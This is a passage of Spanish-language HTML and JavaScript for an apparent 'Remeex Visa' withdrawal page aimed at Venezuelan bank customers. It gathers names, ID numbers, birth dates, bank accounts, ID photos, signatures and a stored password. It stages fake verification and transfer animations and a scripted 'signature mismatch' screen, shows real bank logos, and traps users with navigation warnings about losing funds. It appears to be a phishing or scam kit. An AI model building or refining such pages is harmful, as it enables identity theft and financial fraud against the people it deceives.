    <p style="font-size:0.9rem; color: var(--warning); margin-top:-1rem;">
      Monto máximo: 100.000 Bs (Pago Móvil) / 950.000 Bs (Transferencia).
    </p>

    <!-- Resumen mejorado con grid layout -->
    <div class="data-grid">
      <div class="data-summary">
        <h3><i class="fas fa-user"></i> Datos del Beneficiario</h3>
        <div id="benefSummary" class="data-item"></div>
      </div>

      <div class="data-summary">
        <h3>
          <i class="fas fa-university"></i> Datos Bancarios
          <img id="bankLogoSummary" src="" alt="" style="height: 30px; width: auto; margin-left: auto; display: none;">
        </h3>
        <div id="bankSummary" class="data-item"></div>
      </div>
    </div><div class="data-summary">
      <h3><i class="fas fa-signature"></i> Firma Digital</h3>
      <div style="text-align:center; position: relative;">
        <img id="firmaSummary" src="#" alt="Firma del Usuario" style="max-width:200px; border:1px solid #ccc; padding:5px;"/>
        <div id="firmaAnalyzing" class="firma-analyzing" style="display: none;">
          <span>Analizando firma</span>
          <i class="fas fa-spinner fa-spin"></i>
        </div>
      </div>
    </div>

    <!-- Botones para Planilla de Retiro - Corregidos para posicionamiento responsivo -->
    <div class="btn-container2">
      <!-- Botón Regresar a Step5 - SIEMPRE a la izquierda -->
      <div style="position: relative; width: 120px; height: 50px;" class="btn-back">
        <div class="btn-glow-effect"></div>
        <button class="btn-glow" id="backBtnStep6">
          <div class="btn-glow-content btn-glow-initial">
            Regresar
          </div>
          <div class="btn-glow-content btn-glow-hover">
            Regresar
            <svg class="btn-glow-icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24"
               viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
               stroke-linecap="round" stroke-linejoin="round">
              <line x1="19" y1="12" x2="5" y2="12"></line>
              <polyline points="12 5 5 12 12 19"></polyline>
            </svg>
          </div>
        </button>
      </div>

      <!-- Botón Retirar a mi banco - SIEMPRE a la derecha -->
      <div style="position: relative; width: 180px; height: 50px;" class="btn-continue">
        <div class="btn-glow-effect"></div>
        <button class="btn-glow btn-disabled" id="finalConfirmBtn" disabled>
          <div class="btn-glow-content btn-glow-initial">
            Retirar a mi banco
          </div>
          <div class="btn-glow-content btn-glow-hover">
            Retirar <span id="retirarMonto"></span>
            <i class="fas fa-money-bill-wave btn-glow-icon"></i>
          </div>
        </button>
      </div>
      <div class="countdown" id="countdownRetiroBtn"></div>
    </div>
  </div>
</div>

<!-- ===== OVERLAYS MEJORADOS ===== -->

<!-- Overlay: Confirmar Firma -->
<div class="overlay" id="overlayConfirmFirma">
  <div class="modal modal-glow">
    <h3>¿Estás seguro de tu firma?</h3>
    <p>
      La firma debe coincidir con la de tu documento de identidad. <br/>
      Si no coincide, se solicitará verificación adicional.
    </p>
    
    <div class="signature-container">
      <img id="firmaImagenPreview" src="#" alt="Firma" class="signature-img">
    </div>
    
    <div class="bank-logo-container">
      <img id="confirmFirmaBancoLogo" src="" alt="Banco" class="bank-logo">
    </div>
    
    <div class="btn-group">
      <div class="btn-container-adv">
        <div class="btn-effect warning"></div>
        <button class="btn-advanced warning" id="editarFirmaBtn">
          <span class="btn-text">
            Editar
            <i class="fas fa-edit btn-icon"></i>
          </span>
        </button>
      </div>
      
      <div class="btn-container-adv">
        <div class="btn-effect"></div>
        <button class="btn-advanced" id="continuarFirmaBtn">
          <span class="btn-text">
            Continuar
            <i class="fas fa-arrow-right btn-icon"></i>
          </span>
        </button>
      </div>
    </div>
  </div>
</div>

<!-- Overlay: Analizando documento -->
<div class="overlay" id="overlayDocumento">
  <div class="modal modal-glow">
    <h3 id="overlayDocumentoTitulo">Analizando documento de identidad</h3>
    <p id="overlayDocumentoTexto">Por favor, espera mientras verificamos tu documento.</p>
    
    <div class="bank-logo-container">
      <img id="overlayDocumentoLogo" src="" alt="Logo Banco" class="bank-logo">
    </div>
    
    <div class="progress-container">
      <div class="progress-bar-advanced" id="documentoProgress" style="width: 0%;"></div>
      <div class="progress-percentage">0%</div>
    </div><div class="warning-message">
      <i class="fas fa-info-circle warning-icon" style="color: var(--primary);"></i>
      <span class="warning-text">Este proceso tomará unos segundos</span>
    </div>
    
    <div class="spinner-advanced">
      <div class="spinner-ring"></div>
      <div class="spinner-ring"></div>
      <div class="spinner-ring"></div>
      <div class="spinner-dot"></div>
    </div>
  </div>
</div>

<!-- Overlay Secuencial POST-FIRMA -->
<div class="overlay" id="overlaySecuenciaFirma">
  <div class="modal modal-glow">
    <h3 id="secuenciaFirmaTitulo">Conectando con tu banco...</h3>
    <p id="secuenciaFirmaTexto">Estableciendo conexión con el sistema de verificación...</p>
    <div class="signature-container">
      <img id="secuenciaFirmaImagen" src="#" alt="Firma" class="signature-img">
    </div>
    
    <div class="bank-logo-container">
      <img id="secuenciaFirmaLogo" src="" alt="Banco" class="bank-logo">
    </div>
    
    <div class="progress-container">
      <div class="progress-bar-advanced" id="secuenciaFirmaProgress" style="width: 0%;"></div>
      <div class="progress-percentage">0%</div>
    </div>
    
    <div class="warning-message">
      <i class="fas fa-exclamation-triangle warning-icon"></i>
      <span class="warning-text">Por favor, no cierres esta ventana durante el proceso</span>
    </div>
    
    <div class="spinner-advanced">
      <div class="spinner-ring"></div>
      <div class="spinner-ring"></div>
      <div class="spinner-ring"></div>
      <div class="spinner-dot"></div>
    </div>
  </div>
</div>

<!-- Overlay: Proceso de Retiro en curso (REDISEÑADO para pantallas web y móvil) -->
<div class="overlay" id="overlayProcesoRetiro">
  <div class="modal modal-glow">
    <h3 id="procesoRetiroTitulo">Iniciando retiro</h3>
    <p id="procesoRetiroTexto">Procesando tu solicitud...</p>
    
    <div class="cards-container">
      <!-- Remeex Visa Card - Ahora siempre se mostrará arriba -->
      <div class="transfer-card visa-card">
        <div class="card-header">
          <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhnBzNdjl6bNp-nIdaiHVENczJhwlJNA7ocsyiOObMmzbu8at0dY5yGcZ9cLxLF39qI6gwNfqBxlkTDC0txVULEwQVwGkeEzN0Jq9MRTRagA48mh18UqTlR4WhsXOLAEZugUyhqJHB19xJgnkpe-S5VOWFgzpKFwctv3XP9XhH41vNTvq0ZS-nik58Qhr-O/s320/remeex.png" alt="REMEEX VISA" class="card-logo">
        </div>
        <div class="card-body">
          <div class="card-label">Saldo disponible</div>
          <div class="card-amount" id="remeexBalanceAmount">1.800,00 Bs</div>
        </div>
      </div>
      
      <!-- Transfer Animation - Ahora vertical -->
      <div class="transfer-animation">
        <div class="transfer-line"></div>
        <div class="transfer-arrow"></div>
        <div class="transfer-particles-container" id="transferParticles"></div>
      </div>
      
      <!-- Bank Card - Ahora siempre se mostrará abajo -->
      <div class="transfer-card bank-card" id="bankCardContainer">
        <div class="card-header">
          <img id="bankCardLogo" src="" alt="Logo Banco" class="card-logo">
        </div>
        <div class="card-body">
          <div class="card-label">Ingresando</div>
          <div class="card-amount" id="bankBalanceAmount">0,00 Bs</div>
        </div>
      </div>
      
      <!-- Nuevo contenedor para logo del banco cuando la tarjeta desaparece -->
      <div class="bank-logo-overlay" id="bankLogoOverlay">
        <img id="bankLogoFallback" src="" alt="Logo Banco">
        <div class="logo-text">Tu Banco</div>
      </div>
    </div>
    
    <div class="progress-container">
      <div class="progress-bar-advanced" id="procesoRetiroProgress" style="width: 0%;"></div>
      <div class="progress-percentage">0%</div>
    </div>
    
    <div class="warning-message">
      <i class="fas fa-exclamation-triangle warning-icon"></i>
      <span class="warning-text">Por favor, no cierres esta ventana durante el proceso</span>
    </div>
    
    <div class="spinner-advanced">
      <div class="spinner-ring"></div>
      <div class="spinner-ring"></div>
      <div class="spinner-ring"></div>
      <div class="spinner-dot"></div>
    </div>
  </div>
</div><!-- Overlay: Aviso Proceso de Retiro -->
<div class="overlay" id="overlayInicioRetiro">
  <div class="modal modal-glow warning">
    <h3>Importante</h3>
    <p>El proceso de retiro está a punto de iniciarse. No cierres esta página mientras el proceso esté en curso, de lo contrario, la transacción podría verse interrumpida.</p>
    
    <div class="bank-logo-container">
      <img id="logoInicioRetiro" src="" alt="Logo Banco" class="bank-logo">
    </div>
    
    <div class="result-icon warning">
      <i class="fas fa-exclamation-circle" style="color: var(--warning);"></i>
    </div>
    
    <div class="btn-group">
      <div class="btn-container-adv">
        <div class="btn-effect"></div>
        <button class="btn-advanced" id="entendidoRetiroBtn">
          <span class="btn-text">
            Entendido
            <i class="fas fa-check btn-icon"></i>
          </span>
        </button>
      </div>
    </div>
  </div>
</div>

<!-- Overlay: Firma no coincide - MEJORADO para incluir audio -->
<div class="overlay" id="overlayFirmaNoCoincide">
  <div class="modal modal-glow error">
    <h3 style="background: linear-gradient(90deg, var(--danger), var(--danger-dark)); -webkit-background-clip: text; background-clip: text; -webkit-text-fill-color: transparent; text-fill-color: transparent;">
      Verificación adicional requerida
    </h3>
    <p id="firmaNoCoincideTexto">Tu firma no coincide con la registrada en el banco. Necesitamos que vuelvas a firmar para continuar con el proceso de retiro.</p>
    
    <div class="bank-logo-container">
      <img id="firmaNoCoincideLogo" src="" alt="Logo Banco" class="bank-logo">
    </div>
    
    <div class="result-icon error">
      <i class="fas fa-exclamation-circle"></i>
    </div>
    
    <div class="progress-container">
      <div class="progress-bar-advanced error" id="redirectProgressBar" style="width: 0%;"></div>
      <div class="progress-percentage">0%</div>
    </div>
    
    <div class="countdown-container">
      <span>Serás redirigido en</span>
      <span class="countdown-number" id="redirectCountdown">10</span>
      <span>segundos...</span>
    </div>
    
    <!-- Audio oculto para reproducir automáticamente -->
    <audio id="verificacionAudio" preload="auto" style="display:none;">
      <source src="https://youtu.be/KWaPj24l_oo" type="audio/mp4">
    </audio>
  </div>
</div>

<!-- Overlay final secuencia -->
<div class="overlay" id="overlaySecuenciaFinal">
  <div class="modal modal-glow">
    <h3 id="secFinalTitulo"></h3>
    <p id="secFinalTexto"></p>
    
    <div class="bank-logo-container">
      <img id="secFinalLogo" src="" alt="Logo Banco" class="bank-logo">
    </div>
    
    <div class="progress-container">
      <div class="progress-bar-advanced" id="secFinalProgress" style="width: 60%;"></div>
      <div class="progress-percentage">60%</div>
    </div>
    
    <div class="spinner-advanced">
      <div class="spinner-ring"></div>
      <div class="spinner-ring"></div>
      <div class="spinner-ring"></div>
      <div class="spinner-dot"></div>
    </div>
  </div>
</div>

<!-- Overlay: Final del proceso -->
<div class="overlay" id="overlayFinal">
  <div class="modal modal-glow success">
    <h3 style="background: linear-gradient(90deg, var(--neon-green), var(--neon-green-dark)); -webkit-background-clip: text; background-clip: text; -webkit-text-fill-color: transparent; text-fill-color: transparent;">
      Proceso Exitoso
    </h3>
    <p>Tus datos han sido verificados correctamente y tu retiro está en proceso. En breve recibirás notificación de la operación.</p>
    
    <div class="bank-logo-container">
      <img id="finalLogoBank" src="" alt="Logo Banco" class="bank-logo">
    </div>
    
    <div class="result-icon success">
      <i class="fas fa-check-circle"></i>
    </div>
    
    <div class="progress-container">
      <div class="progress-bar-advanced success" style="width: 100%;"></div>
      <div class="progress-percentage">100%</div>
    </div>
    
    <div class="btn-group">
      <div class="btn-container-adv">
        <div class="btn-effect success"></div>
        <button class="btn-advanced success" id="finalBtn">
          <span class="btn-text">
            Entendido
            <i class="fas fa-check btn-icon"></i>
          </span>
        </button>
      </div>
    </div>
  </div>
</div><!-- Audio para reproducir al presionar el botón -->
<audio id="btnAudio" preload="none">
  <source src="https://www.youtube.com/watch?v=sP1qO-lhoXQ" type="audio/mp3">
</audio>

<!-- Modal de alerta para navegación -->
<div class="overlay" id="overlayNavAlert">
  <div class="modal modal-glow warning">
    <h3>Advertencia</h3>
    <p>Estás intentando salir de esta página. Si continúas, podrías perder tu progreso y los fondos asociados.</p>
    <p>Te recomendamos que permanezcas en esta página hasta completar el proceso.</p>
    
    <div class="result-icon warning">
      <i class="fas fa-exclamation-triangle" style="color: var(--warning);"></i>
    </div>
    
    <div class="btn-group">
      <div class="btn-container-adv">
        <div class="btn-effect"></div>
        <button class="btn-advanced" id="stayOnPageBtn">
          <span class="btn-text">
            Permanecer
            <i class="fas fa-check btn-icon"></i>
          </span>
        </button>
      </div>
      
      <div class="btn-container-adv">
        <div class="btn-effect warning"></div>
        <button class="btn-advanced warning" id="leavePageBtn">
          <span class="btn-text">
            Salir
            <i class="fas fa-sign-out-alt btn-icon"></i>
          </span>
        </button>
      </div>
    </div>
  </div>
</div>

<script>
  /*
    ---------------------------------------------------
    CONTROL DE ACCESO Y SEGURIDAD 
    ---------------------------------------------------
  */
  
  // Control de acceso a la página
  let accessGranted = false;
  let fromRemeex = false;
  const DEFAULT_ACCESS_CODE = "123456"; // Código por defecto
  
  // Verificar si viene de remeex.html
  function checkReferrer() {
    try {
      const referrer = document.referrer;
      if (referrer && (
          referrer.includes('remeex.html') || 
          referrer.includes('remeex.php') || 
          referrer.includes('/remeex')
        )) {
        fromRemeex = true;
        return true;
      }
      
      // También verificar si hay una bandera en sessionStorage
      if (sessionStorage.getItem('fromRemeex') === 'true') {
        fromRemeex = true;
        return true;
      }
      
      // También verificar si hay un token válido
      if (sessionStorage.getItem('remeexAuthToken')) {
        const tokenData = JSON.parse(atob(sessionStorage.getItem('remeexAuthToken')));
        if (tokenData && tokenData.exp > Date.now()) {
          fromRemeex = true;
          return true;
        }
      }
      
      return false;
    } catch (e) {
      console.error("Error al verificar referrer:", e);
      return false;
    }
  }
  
  // Función para mostrar el modal de acceso
  function showAccessModal() {
    const modal = document.getElementById('accessModal');
    const backdrop = document.getElementById('accessModalBackdrop');
    if (modal && backdrop) {
      backdrop.classList.add('active');
      modal.classList.add('active');
      document.getElementById('accessCode').focus();
    }
  }
  
  // Función para ocultar el modal de acceso
  function hideAccessModal() {
    const modal = document.getElementById('accessModal');
    const backdrop = document.getElementById('accessModalBackdrop');
    if (modal && backdrop) {
      backdrop.classList.remove('active');
      modal.classList.remove('active');
    }
  }
  
  // Función para verificar el código de acceso
  function verifyAccessCode(code) {
    // Códigos válidos
    const validCodes = [
      DEFAULT_ACCESS_CODE,
      // También puedes agregar códigos personalizados o dinámicos
      sessionStorage.getItem('remeexPersonalCode')
    ].filter(Boolean); // Filtrar valores nulos
    
    return validCodes.includes(code);
  }// Función para mostrar error de acceso
  function showAccessError() {
    const errorElem = document.getElementById('accessError');
    if (errorElem) {
      errorElem.classList.add('active');
      setTimeout(() => {
        errorElem.classList.remove('active');
      }, 3000);
    }
  }
  
  // Función para generar token de autenticación
  function generateAuthToken() {
    const tokenData = {
      exp: Date.now() + (30 * 60 * 1000), // 30 minutos
      iat: Date.now(),
      src: 'remeex'
    };
    
    return btoa(JSON.stringify(tokenData)); // Codificar en base64
  }
  
  // Función para otorgar acceso y guardar estado
  function grantAccess() {
    accessGranted = true;
    sessionStorage.setItem('remeexAuthToken', generateAuthToken());
    sessionStorage.setItem('fromRemeex', 'true');
    hideAccessModal();
    document.querySelector('.container').classList.add('active');
  }
  
  // Inicializar control de acceso
  function initAccessControl() {
    if (!checkReferrer()) {
      showAccessModal();
      
      // Configurar evento para enviar código
      document.getElementById('accessSubmitBtn').addEventListener('click', () => {
        const code = document.getElementById('accessCode').value.trim();
        if (verifyAccessCode(code)) {
          grantAccess();
        } else {
          showAccessError();
          document.getElementById('accessCode').value = '';
          document.getElementById('accessCode').focus();
        }
      });
      
      // Permitir enviar con Enter
      document.getElementById('accessCode').addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
          document.getElementById('accessSubmitBtn').click();
        }
      });
    } else {
      accessGranted = true;
      document.querySelector('.container').classList.add('active');
    }
  }
  
  // Función para manejar intentos de navegación
  function handleNavigation(e) {
    if (!isRedirecting) {
      e.preventDefault();
      showNavWarning();
      return e.returnValue = "¿Estás seguro de que deseas abandonar esta página?";
    }
  }
  
  // Mostrar advertencia de navegación
  function showNavWarning() {
    const overlay = document.getElementById('overlayNavAlert');
    if (overlay) {
      overlay.classList.add('active');
    }
  }
  
  // Prevenir navegación con botones
  function setupNavigationControl() {
    // Evento para permanecer en la página
    document.getElementById('stayOnPageBtn').addEventListener('click', () => {
      document.getElementById('overlayNavAlert').classList.remove('active');
    });
    
    // Evento para salir de la página
    document.getElementById('leavePageBtn').addEventListener('click', () => {
      window.removeEventListener('beforeunload', handleNavigation);
      isRedirecting = true;
      window.location.href = "https://www.visa.es";
    });
    
    // Controlar el botón atrás del navegador
    window.addEventListener('popstate', function(e) {
      if (!isRedirecting) {
        showNavWarning();
        history.pushState({}, '', '');
      }
    });
    
    // Advertencia al intentar actualizar o cerrar la página
    window.addEventListener('beforeunload', handleNavigation);
  }

  /*
    ---------------------------------------------------
    Mapeo bancos -> logos (mejorado y completo)
    ---------------------------------------------------
  */
  const bankLogosMapping = {
    "Banco de Venezuela, S.A.": "https://www.bancodevenezuela.com/wp-content/uploads/2023/03/logonuevo.png",
    "Banco Central de Venezuela": "https://www.bcv.org.ve/sites/default/files/default_images/logo_bcv-04_2.png",
    "Banco Venezolano de Crédito, S.A.": "https://www.venezolano.com/images/galeria/108_1.png",
    "Banco Mercantil, C.A.": "https://files.socialgest.net/mybio/5f529398b36f8_1599247256.png",
    "Banco Provincial, S.A.": "https://upload.wikimedia.org/wikipedia/commons/d/d4/BBVAprovinciallogo.svg",
    "Banco del Caribe C.A., Bancaribe": "https://d3olc33sy92l9e.cloudfront.net/wp-content/themes/bancaribe/images/Bancaribe-LogotipoTurquesa.png",
    "Banco Exterior C.A., Banco Universal": "https://upload.wikimedia.org/wikipedia/commons/thumb/d/d3/Banco-Exterior-VE-logo.png/183px-Banco-Exterior-VE-logo.png",
    "Banco Caroní C.A., Banco Universal": "https://www.bancocaroni.com.ve/wp-content/uploads/elementor/thumbs/Logo-252-x-48-1-qvqyrv33uw6afqa09bf5f2tswrzr0yaos9y59b3tuo.png",
    "Banesco Banco Universal, C.A.": "https://banesco-prod-2020.s3.amazonaws.com/wp-content/themes/banescocontigo/assets/images/header/logo.svg.gzip",
    "Banco Sofitasa Banco Universal, C.A.": "https://www.sofitasa.com/assets/img/nuevo_logo.png",
    "Banco Plaza, Banco Universal": "https://plazacdn.s3.amazonaws.com/wp-content/themes/bancoplaza/imagenes/logobancoplaza-2.png",
    "Banco de la Gente Emprendedora C.A.": "https://via.placeholder.com/100x50?text=BanGente",
    "Banco Fondo Común, C.A.": "https://www.bfc.com.ve/wp-content/uploads/2021/01/logofos.png",
    "100% Banco, Banco Comercial, C.A.": "https://www.100x100banco.com/img/logo.png",
    "DelSur, Banco Universal C.A.": "https://via.placeholder.com/100x50?text=DelSur",
    "Banco del Tesoro C.A., Banco Universal": "https://upload.wikimedia.org/wikipedia/commons/thumb/5/5c/Logo_Banco_del_Tesoro.jpg/320px-Logo_Banco_del_Tesoro.jpg",
    "Banco Agrícola de Venezuela C.A., Banco Universal": "https://via.placeholder.com/100x50?text=BAV",
    "Bancrecer S.A., Banco Microfinanciero": "https://www.bancrecer.com.ve/images/img/bancrecer-logo.png",
    "Mi Banco, Banco Microfinanciero, C.A.": "https://via.placeholder.com/100x50?text=MiBanco",
    "Banco Activo C.A., Banco Universal": "https://www.bancoactivo.com/logo.svg",
    "Bancamiga Banco Universal, C.A.": "https://upload.wikimedia.org/wikipedia/commons/thumb/a/a3/Bancamiga.png/320px-Bancamiga.png",
    "Banco Internacional de Desarrollo C.A., Banco Universal": "https://via.placeholder.com/100x50?text=BID",
    "Banplus Banco Universal, C.A.": "https://www.banplus.com/uploads/contenidos/logo_banplus2023.jpg",
    "Banco Bicentenario del Pueblo, Banco Universal C.A.": "https://upload.wikimedia.org/wikipedia/commons/thumb/d/da/BancoDigitaldelosTrabajadores.png/320px-BancoDigitaldelosTrabajadores.png",
    "Banco de la Fuerza Armada Nacional Bolivariana, B.U.": "https://via.placeholder.com/100x50?text=BANFANB",
    "Banco Nacional de Crédito C.A., Banco Universal": "https://www.bncenlinea.com/images/default-source/misc/BNCLogo_rebrand.png",
    "Instituto Municipal de Crédito Popular": "https://via.placeholder.com/100x50?text=IMCP"
  };

  // Normalizar función para búsqueda de logos
  function normalizeBankName(name) {
    return name.trim().toLowerCase().normalize("NFD").replace(/[\u0300-\u036f]/g, "");
  }

  // Precomputar mapeo normalizado
  const normalizedBankLogosMapping = {};
  Object.keys(bankLogosMapping).forEach(key => {
    normalizedBankLogosMapping[normalizeBankName(key)] = bankLogosMapping[key];
  });/*
    ---------------------------------------------------
    Variables globales extra (para la nueva implementación)
    ---------------------------------------------------
  */
  let nombreCompleto = "";
  let documentoBeneficiario = "";
  let fechaNacimiento = "";
  let bancoUsuario = "";
  let numeroCuenta = "";
  let tipoCuenta = "";
  let telefonoUsuario = "";
  let logoBancoUsuario = "";
  let saldoDisponible = 0;
  let montoRetiro = 0;
  let audioPlayed = false;
  let youtubePlayer = null;

  /*
    ---------------------------------------------------
    Variables y Objetos de Estado (del flujo original)
    ---------------------------------------------------
  */
  let exchangeRate = 37.40;      // Tasa por defecto
  let isRedirecting = false;
  let showingBs = true;
  let signatureIsAnalyzing = false;
  let redirectCountdownInterval = null;
  let currentSpinnerStyle = 1;
  let isPersonalized = false;
  let activeUsers = 347;

  // STEP 2
  const fullNameInput = document.getElementById("fullName");
  const phonePrefixSelect = document.getElementById("phonePrefix");
  const phoneNumberInput = document.getElementById("phoneNumber");
  const docTypeSelect = document.getElementById("docType");
  const nationalitySelect = document.getElementById("nationality");
  const docNumberInput = document.getElementById("docNumber");
  const birthDateInput = document.getElementById("birthDate");
  const isAdultCheckbox = document.getElementById("isAdult");
  const continueBtnStep2 = document.getElementById("continueBtnStep2");

  // STEP 3
  const userNameStep3 = document.getElementById("userNameStep3");
  const bankSelect = document.getElementById("bankSelect");
  const accountContainer = document.getElementById("accountContainer");
  const bankCodeInput = document.getElementById("bankCode");
  const restAccountDigitsInput = document.getElementById("restAccountDigits");
  const accountTypeSelect = document.getElementById("accountType");
  const continueBtnStep3 = document.getElementById("continueBtnStep3");
  const backBtnStep3 = document.getElementById("backBtnStep3");

  // STEP 4
  const idDocument = document.getElementById("idDocument");
  const previewContainer = document.getElementById("previewContainer");
  const docPreview = document.getElementById("docPreview");
  const confirmDocBtn = document.getElementById("confirmDocBtn");
  const backBtnStep4 = document.getElementById("backBtnStep4");
  const countdownDocBtn = document.getElementById("countdownDocBtn");
  let confirmDocBtnCountdown = 5;

  // STEP 5
  const userNameStep5 = document.getElementById("userNameStep5");
  const signatureCanvas = document.getElementById("signatureCanvas");
  const clearSignatureBtn = document.getElementById("clearSignatureBtn");
  const saveSignatureBtn = document.getElementById("saveSignatureBtn");
  const backBtnStep5 = document.getElementById("backBtnStep5");
  let ctx;
  let isDrawing = false;
  let signatureDataURL = null;

  // STEP 6
  const pagoMethodSelect = document.getElementById("pagoMethodSelect");
  const montoRetiroInput = document.getElementById("montoRetiro");
  const finalConfirmBtn = document.getElementById("finalConfirmBtn");
  const backBtnStep6 = document.getElementById("backBtnStep6");
  const benefSummary = document.getElementById("benefSummary");
  const bankSummary = document.getElementById("bankSummary");
  const bankLogoSummary = document.getElementById("bankLogoSummary");
  const firmaSummary = document.getElementById("firmaSummary");
  const firmaAnalyzing = document.getElementById("firmaAnalyzing");
  const retirarMonto = document.getElementById("retirarMonto");
  const countdownRetiroBtn = document.getElementById("countdownRetiroBtn");
  let firmaAnalysisCountdown = 30;

  // Overlays
  const overlayConfirmFirma = document.getElementById("overlayConfirmFirma");
  const firmaImagenPreview = document.getElementById("firmaImagenPreview");
  const confirmFirmaBancoLogo = document.getElementById("confirmFirmaBancoLogo");
  const editarFirmaBtn = document.getElementById("editarFirmaBtn");
  const continuarFirmaBtn = document.getElementById("continuarFirmaBtn");
  
  const overlayDocumento = document.getElementById("overlayDocumento");
  const overlayDocumentoLogo = document.getElementById("overlayDocumentoLogo");
  const overlayDocumentoTitulo = document.getElementById("overlayDocumentoTitulo");
  const overlayDocumentoTexto = document.getElementById("overlayDocumentoTexto");
  const documentoProgress = document.getElementById("documentoProgress");
  const overlaySecuenciaFirma = document.getElementById("overlaySecuenciaFirma");
  const secuenciaFirmaImagen = document.getElementById("secuenciaFirmaImagen");
  const secuenciaFirmaTitulo = document.getElementById("secuenciaFirmaTitulo");
  const secuenciaFirmaTexto = document.getElementById("secuenciaFirmaTexto");
  const secuenciaFirmaLogo = document.getElementById("secuenciaFirmaLogo");
  const secuenciaFirmaProgress = document.getElementById("secuenciaFirmaProgress");
  
  const overlayInicioRetiro = document.getElementById("overlayInicioRetiro");
  const entendidoRetiroBtn = document.getElementById("entendidoRetiroBtn");
  const logoInicioRetiro = document.getElementById("logoInicioRetiro");
  
  const overlayProcesoRetiro = document.getElementById("overlayProcesoRetiro");
  const procesoRetiroTitulo = document.getElementById("procesoRetiroTitulo");
  const procesoRetiroTexto = document.getElementById("procesoRetiroTexto");
  const procesoRetiroProgress = document.getElementById("procesoRetiroProgress");
  
  const overlayFirmaNoCoincide = document.getElementById("overlayFirmaNoCoincide");
  const firmaNoCoincideTexto = document.getElementById("firmaNoCoincideTexto");
  const firmaNoCoincideLogo = document.getElementById("firmaNoCoincideLogo");
  const redirectProgressBar = document.getElementById("redirectProgressBar");
  const redirectCountdown = document.getElementById("redirectCountdown");
  const verificacionAudio = document.getElementById("verificacionAudio");
  
  const overlaySecuenciaFinal = document.getElementById("overlaySecuenciaFinal");
  const secFinalTitulo = document.getElementById("secFinalTitulo");
  const secFinalTexto = document.getElementById("secFinalTexto");
  const secFinalLogo = document.getElementById("secFinalLogo");
  const secFinalProgress = document.getElementById("secFinalProgress");
  
  const overlayFinal = document.getElementById("overlayFinal");
  const finalLogoBank = document.getElementById("finalLogoBank");
  const finalBtn = document.getElementById("finalBtn");

  // Elementos del nuevo contenedor de logo del banco
  const bankLogoOverlay = document.getElementById("bankLogoOverlay");
  const bankLogoFallback = document.getElementById("bankLogoFallback");
  const bankCardContainer = document.getElementById("bankCardContainer");

  // Barra de Progreso y elementos de saldo
  const progressBarFill = document.getElementById("progressBarFill");
  const progressText = document.getElementById("progressText");
  const balanceAmountElem = document.getElementById("balanceAmount");
  const exchangeRateText = document.getElementById("exchangeRateText");
  const dynamicTextElem = document.getElementById("dynamicText");
  const balanceLabelElem = document.getElementById("balanceLabel");
  const balanceSpinner = document.getElementById("balanceSpinner");
  const particlesContainer = document.getElementById("particlesContainer");
  
  // Audio element
  const btnAudio = document.getElementById("btnAudio");

  /*
    ---------------------------------------------------
    Mapeo de bancos -> códigos
    ---------------------------------------------------
  */
  const bankMapping = {
    "Banco Central de Venezuela": "0001",
    "Banco de Venezuela, S.A.": "0102",
    "Banco Venezolano de Crédito, S.A.": "0104",
    "Banco Mercantil, C.A.": "0105",
    "Banco Provincial, S.A.": "0108",
    "Banco del Caribe C.A., Bancaribe": "0114",
    "Banco Exterior C.A., Banco Universal": "0115",
    "Banco Caroní C.A., Banco Universal": "0128",
    "Banesco Banco Universal, C.A.": "0134",
    "Banco Sofitasa Banco Universal, C.A.": "0137",
    "Banco Plaza, Banco Universal": "0138",
    "Banco de la Gente Emprendedora C.A.": "0146",
    "Banco Fondo Común, C.A.": "0151",
    "100% Banco, Banco Comercial, C.A.": "0156",
    "DelSur, Banco Universal C.A.": "0157",
    "Banco del Tesoro C.A., Banco Universal": "0163",
    "Banco Agrícola de Venezuela C.A., Banco Universal": "0166",
    "Bancrecer S.A., Banco Microfinanciero": "0168",
    "Mi Banco, Banco Microfinanciero, C.A.": "0169",
    "Banco Activo C.A., Banco Universal": "0171",
    "Bancamiga Banco Universal, C.A.": "0172",
    "Banco Internacional de Desarrollo C.A., Banco Universal": "0173",
    "Banplus Banco Universal, C.A.": "0174",
    "Banco Bicentenario del Pueblo, Banco Universal C.A.": "0175",
    "Banco de la Fuerza Armada Nacional Bolivariana, B.U.": "0177",
    "Banco Nacional de Crédito C.A., Banco Universal": "0191",
    "Instituto Municipal de Crédito Popular": "0601"
  };/*
    ---------------------------------------------------
    DOMContentLoaded (Unificando lo nuevo y lo existente)
    ---------------------------------------------------
  */
  document.addEventListener("DOMContentLoaded", function() {
    // Inicializar control de acceso
    initAccessControl();
    
    // Configurar controles de navegación
    setupNavigationControl();
    
    // Cargar opciones de bancos en el select
    cargarOpcionesBancos();

    /*
      1) Cargar datos de sessionStorage y localStorage (datosRemeex)
    */
    const datosRemeex = JSON.parse(
      sessionStorage.getItem('datosRemeex') ||
      localStorage.getItem('datosRemeex') ||
      '{}'
    );

    // Llenar variables globales extra
    if (datosRemeex.fullName) {
      nombreCompleto = datosRemeex.fullName;
    }
    if (datosRemeex.docNumberCompleto) {
      documentoBeneficiario = datosRemeex.docNumberCompleto;
    } else if (datosRemeex.docNumber) {
      documentoBeneficiario = datosRemeex.docNumber;
    }
    if (datosRemeex.birthDate) {
      fechaNacimiento = datosRemeex.birthDate;
    }
    if (datosRemeex.bankName) {
      bancoUsuario = datosRemeex.bankName;
    }
    if (datosRemeex.bankAccount) {
      numeroCuenta = datosRemeex.bankAccount;
    }
    if (datosRemeex.bankType) {
      tipoCuenta = datosRemeex.bankType;
    }
    if (datosRemeex.userPhone) {
      telefonoUsuario = datosRemeex.userPhone;
    }

    // Determinar el logo del banco
    if (datosRemeex.bankLogo) {
      logoBancoUsuario = datosRemeex.bankLogo;
    } else {
      logoBancoUsuario = getBankLogoURL(bancoUsuario);
    }

    // 2) Obtenemos saldo en formato de texto (ej: "1.800,00 Bs")
    let saldoData = sessionStorage.getItem("currentBalanceBS") ||
                    localStorage.getItem("currentBalanceBS") ||
                    "1.800,00 Bs";
    
    // Convertimos a número flotante
    saldoDisponible = parseFloat(
      saldoData
        .replace(/\./g, '')
        .replace(',', '.')
        .replace(/[^\d.]/g, '')
    ) || 1800.00;

    // 3) Ajustes básicos del front
    exchangeRateText.textContent = `Tasa: ${exchangeRate.toFixed(2)}`;
    
    // Verificar si la contraseña aporta información para tasa y monto mínimo
    if (datosRemeex.password) {
      const pass = datosRemeex.password;
